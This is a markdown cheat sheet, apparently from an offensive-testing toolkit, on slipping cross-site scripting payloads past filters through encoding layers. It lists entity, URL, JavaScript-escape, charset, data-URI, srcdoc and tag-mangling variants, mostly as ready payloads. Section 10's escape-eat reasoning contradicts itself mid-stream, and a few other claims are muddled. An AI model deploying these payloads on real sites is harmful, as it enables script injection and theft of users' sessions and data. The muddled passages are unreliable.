# Encodings — every decode layer the payload passes through

A payload dies at the layer that doesn't decode it. This file is
the layer catalogue: HTML entities, URL encoding, JS escapes,
unicode, charset confusion, base64/data-URIs — which layer decodes
what, and how to encode a payload through each one.

---

## 1. The decode pipeline

```text
URL decode (%..)          → server routing/param
→ app charset decode       → UTF-8/GBK/ISO-8859-1...
→ template escaping        → entity-encode on output (usually)
→ HTTP response            → browser receives bytes
→ HTML parser              → entities decoded (&..;)
→ attr/url decode          → per-attribute rules
→ script parser            → \xNN \uNNNN \c escapes
→ URL scheme handlers      → javascript:/data: decode internally
→ eval/Function            → another JS parse pass
```

The payload must survive every layer — a `<` that gets URL-decoded
then entity-encoded then entity-DECODED by the browser still lands
as `<` if the decode ordering is right.

---

## 2. HTML entities — the browser-side decode

Named / decimal / hex:

```html
&#60;   &#x3c;   &lt;          -- <
&#62;   &#x3e;   &gt;          -- >
&#34;   &#x22;   &quot;        -- "
&#39;   &#x27;   &apos; &#39;  -- '  (apos = XHTML only)
&#38;   &#x26;   &amp;         -- &
&#96;   &#x60;   —             -- `  (no named entity — use numeric)
&#92;   &#x5c;                 -- \
&#47;   &#x2f;                 -- /
&#61;   &#x3d;                 -- =
&#32;   &#x20;   &nbsp;        -- space / nbsp
&#9;    &#x9;    &Tab;         -- tab
&#10;   &#xa;    &NewLine;     -- newline
&#13;   &#xd;                  -- CR
&#x3c;script&#x3e;             -- <script>
&lt;script&gt;                  -- <script>
&Tab;avascript:alert(1)         -- javascript: with tab inside scheme
&NewLine;javascript:alert(1)
&colon;javascript&colon;        -- colon entity? no — &colon; IS ':'
   javascript&colon;alert(1)    -- javascript:alert(1)
&semi;                          -- ;
&equals; &commat; &lpar; &rpar; -- = @ ( )
```

Where entities decode:

- Inside HTML text — always (that's the whole point).
- Inside attribute values — always.
- Inside `javascript:` URLs — the browser decodes entities BEFORE
  running the scheme, so `jav&#x61;script:alert(1)` works.
- Inside `<script>` — NO (raw text — entities stay literal).
- Inside `<textarea>`/`<title>` — yes (RCDATA decodes entities).
- Inside `style` attrs — only inside the CSS value; entities in
  the attr VALUE decode, the CSS itself doesn't entity-decode.

---

## 3. URL percent-encoding — the transport decode

```text
%27 '     %22 "    %3c <    %3e >    %3d =    %20 space
%60 `     %5c \    %2f /    %3f ?    %23 #    %26 &
%25 %     %00 NUL  %09 tab  %0a LF   %0d CR   %0c FF  %0b VT
%2527 → decodes to %27 → decodes AGAIN to '   (double-decode)
%3cscript%3e       → <script>
%u0027             → ' (IIS-style %u encoding)
```

Double-URL encoding: `'` → `%27` → `%2527` — survives a single
decode on each pass. When the app decodes ONCE, you need `%2527`
so the final `'` lands live after ITS decode.

Overlong UTF-8 encodings (old parsers):

```text
%C0%A7 for '        %E0%80%A7 for '        %F0%80%80%A7
%C0%BC for <        %E0%80%BC
```

Most modern decoders reject overlongs — worth one probe only.

---

## 4. JavaScript escapes — inside string contexts

When the value lands inside a `<script>` string or an event
handler's JS:

```javascript
\x27   '     \x22 "    \x3c <    \x3e >    \x3d =    \x5c \
\x60 `     \x0a \n   \x0d \r   \x09 \t    \x0b \v   \x0c \f
\u0027 '     \u0022 "    \u003c <    \u003e >
\u{27} '     (ES6 codepoint escape)
\cX          control-char escape — \c' is unusual but valid-ish
\0           NUL
\'           literal ' inside single-quoted string
\"           literal " inside double-quoted
\\           literal backslash — the EAT-THE-ESCAPE trick:
   payload: \\';alert(1);//
   lands as: var x="\\';alert(1);//" → JS sees \' = literal ',
              then ;alert(1);// runs
```

The `\\'` trick is the workhorse when the app escapes `'` to `\'` —
YOUR backslash escapes THEIR backslash, leaving the quote live.

Octal escapes: `\047` = `'` — rare but valid in sloppy parsers.

---

## 5. Unicode / charset confusion

```text
UTF-7:      +ADw-script+AD4-alert(1)+ADw-/script+AD4-
            → only when the page declares charset=utf-7 (rare,
              but some error pages do)
UTF-16:     %FF%27 → '  in a utf-16 decoding context
GBK/Big5:   %bf%27 → the %bf%5c multi-byte pair — same trick as
            SQLi's GBK escape-eat (app escapes ' → \'; the GBK
            decoder reads %bf%5c as one char, quote survives)
Full-width: ＜script＞alert(1)＜/script＞
            → some filters normalize NFKC → <script> lands
Half-width: ﾊﾞｲﾄ forms — same idea
Homoglyph:  ｓcript vs script — visual match, byte-diff
```

The GBK class — `%bf%27` → app adds `\` → `%bf%5c%27` → GBK decode
reads `0xbf5c` as one char + `'` live → quote lands unescaped.
Requires the app to convert charset server-side AND escape quotes
— the PHP `addslashes()`+`SET NAMES gbk` classic.

---

## 6. base64 / data-URI payloads

```html
<a href="data:text/html,<script>alert(1)</script>">x</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>
<iframe src="data:text/html,<svg onload=alert(1)>">
<iframe src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">
<form action="data:text/html,<script>alert(1)</script>">
```

data-URI content-type variants:

```text
data:text/html,...            → HTML doc — full script context
data:image/svg+xml,...        → SVG doc — <svg><script>alert(1)</script>
data:text/xml,...             → XML — svg inside
data:text/html;base64,...     → b64 body
data:text/html;charset=utf-8,...
```

`javascript:` still needs a click usually; `data:` in an
`<iframe src>` fires on load — auto-execution without a click.

---

## 7. The layering table — encode a payload N times

```text
'<script>alert(1)</script>'
→ entity:    &lt;script&gt;alert(1)&lt;/script&gt;
→ url:       %3Cscript%3Ealert(1)%3C%2Fscript%3E
→ url-entity:%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B
→ b64:       PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
→ hex:       \x3c\x73\x63\x72\x69\x70\x74\x3e...
→ js-esc:    \u003cscript\u003ealert(1)\u003c/script\u003e
→ utf-7:     +ADw-script+AD4-alert(1)+ADw-/script+AD4-
→ full-width: ＜ｓｃｒｉｐｔ＞alert(1)＜／ｓｃｒｉｐｔ＞
```

Pick the encoding matching the decode layer the value passes
THROUGH — detection.md §7 probes which decodings happen.

---

## 8. The "<" alternatives — when < is filtered but tags still parse

```html
&#x3c;img src=x onerror=alert(1)&#x3e;    -- entity-decoded inside
                                          -- certain render paths
%3cimg src=x onerror=alert(1)%3e           -- url-decoded
<svg><script>alert(1)</script>             -- no < needed if <svg>
                                           -- already in the page
<math><annotation-xml encoding=text/html>
   <img src=x onerror=alert(1)>            -- annotation-xml switch
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
   -- the srcdoc ATTR decodes entities → the inner doc gets real <
```

The srcdoc-entity trick deserves emphasis: `<iframe srcdoc="...">`
contents decode entities before parsing — a fully entity-encoded
payload still executes.

---

## 9. Tag-name mangling — the byte-level dodge

```html
<SCRIPT>alert(1)</SCRIPT>          -- case
<ScRiPt>alert(1)</ScRiPt>
<script >alert(1)</script >
<script/x>alert(1)</script>
<script%20src=x>alert(1)</script>
<scr%69pt>alert(1)</scr%69pt>        -- url-decoded inside HTML? rare
<scr\x69pt>                          -- never valid in HTML
<s cript>alert(1)</s cript>          -- broken — doesn't parse
<script\t>alert(1)</script>
<scr ipt>                            -- doesn't parse
<a\x0bh ref="javascript:alert(1)">    -- VT between tag and attr
```

`%` inside a tag name doesn't decode — URL decoding happens BEFORE
HTML parsing. Real tag-name dodges are whitespace variants
(`%09 %0a %0c %0d %20` and `/` between tag and attributes).

---

## 10. The escape-eat pattern — turning their escape into yours

```text
app does:  ' → \'
send:      \' → app makes it \\' → JS sees \' = literal ' then code
           wait — \\' in JS is backslash + quote-end. Right: the
           app's escape \\' parses as escaped-backslash + quote.
           YOUR '\' before THEIR \' = the quote survives.

app does:  " → \"
send:      \" → same trick

app does:  \ → \\ (escapes backslashes FIRST)
send:      \\' → app makes it \\\\' → JS sees \\ + \' — the
           escaped backslash then escaped quote — quote stays dead.
           send \' instead (single backslash) → app makes it \\' →
           \' = literal quote → dead too. THE DOUBLE-ESCAPED APPS
           ARE SAFE AGAINST THIS — probe first.
```

Probe rule: send `\'` and see what comes back — `\\'` means the
app escaped your backslash; `\'` means your quote got escaped.

---

## 11. The encode-for-position checklist

```text
[ ] where does the value land? (detection.md §2)
[ ] what does the SERVER do to it? (escape? strip? decode?)
[ ] what does the BROWSER do? (entity-decode inside attrs/text)
[ ] how many decode passes? (single = %27; double = %2527)
[ ] does the charset change it? (GBK/UTF-7 tricks §5)
[ ] does the attr decode entities? (srcdoc §8, href §3)
[ ] does the JS string eat escapes? (\\' §4)
[ ] is the value inside a URL? (scheme decode §6)
```

`sanitizer_fuzz.py --forbidden X` sweeps the encodings for you —
the surviving family IS the answer.
